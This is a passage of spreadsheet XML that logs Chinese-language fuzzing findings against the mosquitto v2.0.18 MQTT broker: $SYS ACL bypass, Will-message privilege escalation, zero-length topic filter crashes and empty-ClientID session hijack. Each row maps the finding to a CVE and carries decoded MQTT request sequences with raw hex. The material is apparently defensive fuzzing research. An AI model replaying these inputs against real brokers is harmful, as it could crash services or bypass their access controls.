      <c r="D4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DATA提取出来(336B)\u000a4.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24" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 733B (报告+请求数据)\u000a请求数据: 336B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(336B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='test-client-with-speciag\x00\u0009fuz'(29B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=105500044d51545404c6003c001d7465\u000aMsg[2]: CONNACK session_present=151 reason_code=166 | raw_header=294097a6d114c00bcf8ef9c87f50219d\u000aMsg[3]: PUBREC  | raw_header=5c0127\u000aMsg[4]: TYPE0  | raw_header=002b766572792f646565772f746f7069\u000aMsg[5]: TYPE0  | raw_header=0200\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1d245359532f62726f6b65722f636c69\u000aMsg[7]: (不完整,95B) raw=2f642f65013b48000d2473686172652f677270312f230128a592a8e704cdbe49b24dd9b9f73b7ec0\u000a(尾部95B): 2f642f65013b48000d2473686172652f677270312f230128a592a8e704cdbe49b24dd9b9f73b7ec0baed627511c4c8b59a19</f>
        <v/>
      </c>
      <c r="F4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2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24" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J42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25">
      <c r="A425" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B425" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C425" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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25" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 778B (报告+请求数据)\u000a请求数据: 214B\u000a\u000a---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MQTT请求序列(214B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3908 Topics=[] | raw_header=826f0f4425260013245359532f62726f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=67B | raw_header=3362001d245359532f62726f6b65722f\u000aMsg[3]: PUBLISH  | raw_header=30</f>
        <v/>
      </c>
      <c r="F4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25" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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2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26">
      <c r="A426" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B426" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C426" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000006,sev:3,cat:0102)中的REQUEST DATA提取出来(189B)\u000a4.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26" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0102 ===\u000a大小: 691B (报告+请求数据)\u000a请求数据: 189B\u000a\u000a---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MQTT请求序列(189B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: CONNECT Proto=MQTT v21 ClientID=''(7540B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=105500044d51545415c6003c001d7421\u000aMsg[3]: (不完整,100B) raw=657273696f6e0002105500044d51545404c6003c001d746573742d636c69656e742d776974682d73\u000a(尾部100B): 657273696f6e0002105500044d51545404c6003c001d746573742d636c69656e742d776974682d7370656369616c21402324</f>
        <v/>
      </c>
      <c r="F4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2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26" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J42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27">
      <c r="A427" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B427" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C427" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000006,sev:3,cat:0182)中的REQUEST DATA提取出来(237B)\u000a4.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27" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0182 ===\u000a大小: 906B (报告+请求数据)\u000a请求数据: 237B\u000a\u000a---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MQTT请求序列(237B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=ff64ea03002400351515003698000000\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=105B | raw_header=317e0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,7B) raw=ff7f66757a392d\u000a(尾部7B): ff7f66757a392d</f>
        <v/>
      </c>
      <c r="F4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2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27" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J42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2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28">
      <c r="A428" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B428" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C428" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(77B)\u000a4.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8" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 481B (报告+请求数据)\u000a请求数据: 77B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(77B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=99 Topics=[''(零长度!QoS=1)] | raw_header=8248006300000d2473686172652f6772\u000aMsg[2]: (不完整,3B) raw=6756a7\u000a(尾部3B): 6756a7</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J42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29">
      <c r="A429" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B429" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C429" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(200B)\u000a4.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29" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c0 ===\u000a大小: 816B (报告+请求数据)\u000a请求数据: 200B\u000a\u000a---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MQTT请求序列(200B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4767 Topics=[''(零长度!QoS=1)] | raw_header=821c129f000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='home/+/temperature' QoS=2 retain=True payload_len=138B | raw_header=359e010012686f6d652f2b2f74656d70\u000aMsg[3]: TYPE0  | raw_header=0004173d000f\u000aMsg[4]: (不完整,3B) raw=040ac8\u000a(尾部3B): 040ac8</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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2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30">
      <c r="A430" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B430" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C430" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(163B)\u000a4.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30" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c2 ===\u000a大小: 901B (报告+请求数据)\u000a请求数据: 163B\u000a\u000a---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MQTT请求序列(163B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2885 Topics=[''(零长度!QoS=1)] | raw_header=82240b45000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=91B | raw_header=317a001d245359532f62726f6b65722f\u000aMsg[3]: PINGRESP  | raw_header=d3</f>
        <v/>
      </c>
      <c r="F4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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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1">
      <c r="A431" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B431" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C431" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000006,sev:4,cat:0140)中的REQUEST DATA提取出来(188B)\u000a4.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31" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0140 ===\u000a大小: 722B (报告+请求数据)\u000a请求数据: 188B\u000a\u000a---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MQTT请求序列(188B原始二进制) ---\u000aMsg[1]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[2]: PUBCOMP  | raw_header=7300\u000aMsg[3]: SUBSCRIBE PacketID=5635 Topics=[''(零长度!QoS=3), ''(零长度!QoS=0)] | raw_header=8219160300002f0000105500049e0a77\u000aMsg[4]: PUBCOMP  | raw_header=7200\u000aMsg[5]: TYPE0  | raw_header=0966757a7a73742f23013011000a7465\u000aMsg[6]: (不完整,51B) raw=7270312f23701005000000004bb510e91c8bc47051bfc3781170722cec939fff7fce4d823e5deed9\u000a(尾部51B): 7270312f23701005000000004bb510e91c8bc47051bfc3781170722cec939fff7fce4d823e5deed940232425000a77696c6c</f>
        <v/>
      </c>
      <c r="F4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31" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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3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32">
      <c r="A432" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000006,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B432" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C432" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000006,sev:4,cat:0142)中的REQUEST DATA提取出来(180B)\u000a4.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32" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0142 ===\u000a大小: 860B (报告+请求数据)\u000a请求数据: 180B\u000a\u000a---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MQTT请求序列(180B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=16 | raw_header=482200103c001d7421000a77696c6c2f\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=3)] | raw_header=82190001000013245359532f62726f6b\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=83B | raw_header=34680013245359532f62726f6b65722f\u000aMsg[4]: (不完整,11B) raw=2f677270312f77696c6c2f\u000a(尾部11B): 2f677270312f77696c6c2f</f>
        <v/>
      </c>
      <c r="F4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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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3">
      <c r="A433" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B433" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C433" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(78B)\u000a4.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33" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 422B (报告+请求数据)\u000a请求数据: 78B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(78B原始二进制) ---\u000aMsg[1]: PINGREQ  | raw_header=c000\u000aMsg[2]: (不完整,76B) raw=73696f6e00022d2399fa0800122473686172652f677270312f746573742f2b0badc5c16203000d24\u000a(尾部76B): 73696f6e00022d2399fa0800122473686172652f677270312f746573742f2b0badc5c16203000d2473685179656e745f3031</f>
        <v/>
      </c>
      <c r="F4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3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33" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J43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3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4">
      <c r="A434" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B434" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C434" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(239B)\u000a4.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34" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 771B (报告+请求数据)\u000a请求数据: 239B\u000a\u000a---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MQTT请求序列(239B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=29545 | raw_header=657273696f6e00022d2399fa08001224\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3535555555555555555555553c555555\u000aMsg[3]: (不完整,68B) raw=5555558e5f3031820b000102f7736573742f2301a20a00c000000c656e74663031820b00e6000000\u000a(尾部68B): 5555558e5f3031820b000102f7736573742f2301a20a00c000000c656e74663031820b00e60000000c656e74663031820b00</f>
        <v/>
      </c>
      <c r="F4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3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34" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J43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5">
      <c r="A435" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B435" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C435" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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0x0101\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E435" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 788B (报告+请求数据)\u000a请求数据: 93B\u000a\u000a---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CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(93B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=100d00044d5154540410003c000082\u000aMsg[2]: (不完整,78B) raw=19800a6013612f622f632f642f652f662f4d5171672f682f692f6a00820a000b00052b2f2b2f2b01\u000a(尾部78B): 19800a6013612f622f632f642f652f662f4d5171672f682f692f6a00820a000b00052b2f2b2f2b01a205000c000123c00082</f>
        <v/>
      </c>
      <c r="F4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35" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J4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3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36">
      <c r="A436" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B436" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C436" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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36" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0102 ===\u000a大小: 588B (报告+请求数据)\u000a请求数据: 95B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(95B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=000100\u000aMsg[2]: SUBSCRIBE PacketID=427 Topics=['$SYS/broker/version'(QoS=0)] | raw_header=821801ab0013245359532f62726f6b65\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload='\x01¬\x9a¯&lt;NÒY\u000d")¯\x0b' | raw_header=322c001d245359532f62726f6b65722f\u000aMsg[4]: (不完整,20B) raw=004d51545404300c0006746573742f22f9010203\u000a(尾部20B): 004d51545404300c0006746573742f22f9010203</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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7">
      <c r="A437" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B437" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C437" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:3,cat:0103)中的REQUEST DATA提取出来(79B)\u000a4.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437" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0103 ===\u000a大小: 609B (报告+请求数据)\u000a请求数据: 79B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(79B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=227s [持久会话] | raw_header=104c0000000000e30000194023247fff\u000aMsg[2]: PUBREC  | raw_header=5f</f>
        <v/>
      </c>
      <c r="F4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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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38">
      <c r="A438" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B438" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C438" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:3,cat:0181)中的REQUEST DATA提取出来(322B)\u000a4.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0x0181\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E438" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0181 ===\u000a大小: 1199B (报告+请求数据)\u000a请求数据: 322B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev2】MQTT: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MQTT请求序列(322B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=104800044d5154540500000000000000\u000aMsg[2]: SUBSCRIBE PacketID=42315 Topics=[] | raw_header=8253a54b1a2600000015247368617265\u000aMsg[3]: PUBLISH Topic='#' QoS=0 retain=True payload_len=112B | raw_header=39730001234d01d32339ab08001c2473\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e02c822a1178f74ae41f000a74657374</f>
        <v/>
      </c>
      <c r="F4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38" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J4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3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39">
      <c r="A439" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B439" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C439" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:3,cat:0182)中的REQUEST DATA提取出来(135B)\u000a4.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39" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0182 ===\u000a大小: 928B (报告+请求数据)\u000a请求数据: 135B\u000a\u000a---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MQTT请求序列(135B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=500 Topics=['$SYS/broker/version'(QoS=1), '$share/grp1/#'(QoS=1), 't'(QoS=2)] | raw_header=822c01f40013245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=54B | raw_header=3955001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=6ea9\u000a(尾部2B): 6ea9</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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3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0">
      <c r="A440" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B440" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C440" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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440" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0206 ===\u000a大小: 698B (报告+请求数据)\u000a请求数据: 190B\u000a\u000a---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MQTT请求序列(190B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=057273696f6e0003e82399fa08001224\u000aMsg[2]: PUBREL  | raw_header=6900\u000aMsg[3]: PUBREL  | raw_header=6c00\u000aMsg[4]: PUBLISH Topic='test/x' QoS=2 retain=False payload='\x00\x02before_unsub' | raw_header=34160006746573742f7800026265666f\u000aMsg[5]: PUBREL PacketID=3 | raw_header=62020003\u000aMsg[6]: UNSUBSCRIBE  | raw_header=a20a00020006746573742f23\u000aMsg[7]: PUBLISH Topic='test\x01\x00' QoS=0 retain=False payload='\x06test/#\x000\u000d\x00' | raw_header=3013000674657374010006746573742f\u000aMsg[8]: TYPE0  | raw_header=06067465737a5f70\u000aMsg[9]: TYPE0  | raw_header=02</f>
        <v/>
      </c>
      <c r="F4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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J44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4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1">
      <c r="A441" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B441" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C441" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(141B)\u000a4.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41" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0286 ===\u000a大小: 922B (报告+请求数据)\u000a请求数据: 141B\u000a\u000a---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MQTT请求序列(141B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=47 Topics=['sensor/temp'(QoS=2), 'very/deep/topic/level1/level2/level3/level4'(QoS=1)] | raw_header=823e002f000b73656e736f722f74656d\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=2 retain=True payload_len=54B | raw_header=354a00122473686172652f677270312f\u000aMsg[3]: UNSUBSCRIBE  | raw_header=a9</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J44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4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2">
      <c r="A442" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B442" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C442" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:3,cat:0305)中的REQUEST DATA提取出来(464B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E442" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0305 ===\u000a大小: 1317B (报告+请求数据)\u000a请求数据: 464B\u000a\u000a---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MQTT请求序列(464B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=60s Will=YES [持久会话] | raw_header=100c00044d515454041c003c0000\u000aMsg[2]: SUBSCRIBE PacketID=10 Topics=['a/'\x0fÿÿÿ"\x00\u000a\x19\x00\x17\x01&amp;\x00\u000dmb'(QoS=2)] | raw_header=8218000a0013612f270fffffff22000a\u000aMsg[3]: PUBCOMP PacketID=31333 | raw_header=757a7a65725f73796e63000276350009\u000aMsg[4]: PUBCOMP PacketID=30836 | raw_header=746578742f706c61696e08000e726573\u000aMsg[5]: TYPE0  | raw_header=0100\u000aMsg[6]: TYPE0  | raw_header=044d51545405c6003c281100000e1021\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=000100\u000aMsg[9]: TYPE0  | raw_header=0200\u000aMsg[10]: TYPE0  | raw_header=000e1003000a746578742f706c61696e\u000aMsg[11]: TYPE0  | raw_header=0800\u000aMsg[12]: (不完整,91B) raw=0e726573706f6e73652f746f706963000d77696c6c2f76352f746f706963000b77696c6c5f76355f\u000a(尾部91B): 0e726573706f6e73652f746f706963000d77696c6c2f76352f746f706963000b77696c6c5f76355f6d7367000c66757a7a5f</f>
        <v/>
      </c>
      <c r="F4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4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42" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J44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4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43">
      <c r="A443" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000007,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B443" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C443" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000007,sev:3,cat:0306)中的REQUEST DATA提取出来(311B)\u000a4.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43" s="2">
